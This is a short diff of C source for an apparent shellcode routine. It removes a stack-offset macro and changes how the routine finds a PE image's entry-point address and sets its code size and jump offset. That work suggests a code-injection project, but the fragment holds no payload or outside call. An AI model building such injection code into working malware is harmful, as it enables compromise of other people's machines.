@@ -540,15 +540,9 @@ __forceinline void ShellCodeMain(SCSB *sb) {
 
 //======================================================================
 
-#ifdef DEBUG_ASM
-#define STACK_OFFSET 0xA
-#else
-#define STACK_OFFSET 0x9
-#endif
-
 void ShellCode() {
-__code_start:
     ASM_TAG
+    int __code_start = (int)ShellCode;
 #ifdef DEBUG
     puts("In Shell Code!");
 #endif
@@ -581,8 +575,8 @@ __code_start:
     codeAdr = *(DWORD *)(codeAdr + 0x28); // entry rva
     codeAdr = codeAdr + (DWORD)imageBase; 
     sb->_shellCode = codeAdr;
-    sb->_CODE_SIZE = codeSize + STACK_OFFSET; // 0x9 is stack pointer operations
-    sb->_JMP_POINT_OFFSET = jmpPoint + STACK_OFFSET;
+    sb->_CODE_SIZE = codeSize;
+    sb->_JMP_POINT_OFFSET = jmpPoint;
 #ifdef DEBUG
     printf("Base:%#p Codeinfo: %#p %d %d\n", imageBase, codeAdr, codeSize, jmpPoint);
 #endif
